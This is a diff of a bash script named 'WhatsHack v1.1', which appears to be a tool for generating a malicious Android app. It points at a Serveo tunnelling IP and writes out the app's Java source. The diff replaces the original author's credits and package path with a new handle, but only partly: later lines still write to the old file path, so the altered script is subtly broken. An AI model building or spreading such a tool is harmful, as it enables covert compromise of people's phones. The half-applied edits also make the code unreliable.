@@ -1,8 +1,8 @@
 #!/bin/bash
 # WhatsHack v1.1
-# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
-# Instagram: @zhe_alhaqy
-# Github: https://github.com/ZheHack/whatshack
+# Author: @cr_federal (You don't become a coder by just changing the credits)
+# Instagrm:  m__17__34
+# Github: https://github.com/1mmdfederal/whatshack
 
 host="159.89.214.31" #Serveo.net
 
@@ -44,7 +44,7 @@ printf "  \ \ /\ / /| '_ \ / _\` | __/ __| |_| |/ _\` |/ __| |/ / \n"
 printf "   \ V  V / | | | | (_| | |_\__ \  _  | (_| | (__|   <  \n"
 printf "    \_/\_/  |_| |_|\__,_|\__|___/_| |_|\__,_|\___|_|\_\ v1.1\e[0m\n"
 printf "\n"
-printf "     \e[1;92mAuthor: https://github.com/ZheHack/whatshack\n\e[0m"
+printf "     \e[1;92mAuthor: https://github.com/1mmdfederal/cr_federal\n\e[0m"
 printf "\n"
 }
 
@@ -52,16 +52,16 @@ createapp() {
 
 lazy='\'
 
-if [[ ! -d app/app/src/main/java/com/whatshack/ ]]; then
-mkdir -p app/app/src/main/java/com/whatshack/
+if [[ ! -d app/app/src/main/java/com/1mmdfederal/ ]]; then
+mkdir -p app/app/src/main/java/com/1mmdfederal/
 fi
 
-printf "package com.whatshack;\n" > app/app/src/main/java/com/whatshack/MainActivity.java
+printf "package com.whatshack;\n" > app/app/src/main/java/com/1mmdfederal/cr_federal.java
 
-printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "import android.app.Activity;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
-printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
+printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/1mmdfederal/cr_federal.java
+printf "import android.app.Activity;\n" >> app/app/src/main/java/com/1mmdfederal/cr_federal.java
+printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/1mmdfederal/cr_federal.java
+printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/1mmdfederal/cr_federal.java
 printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "import java.io.DataInputStream;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
 printf "import java.io.DataOutputStream;\n" >> app/app/src/main/java/com/whatshack/MainActivity.java
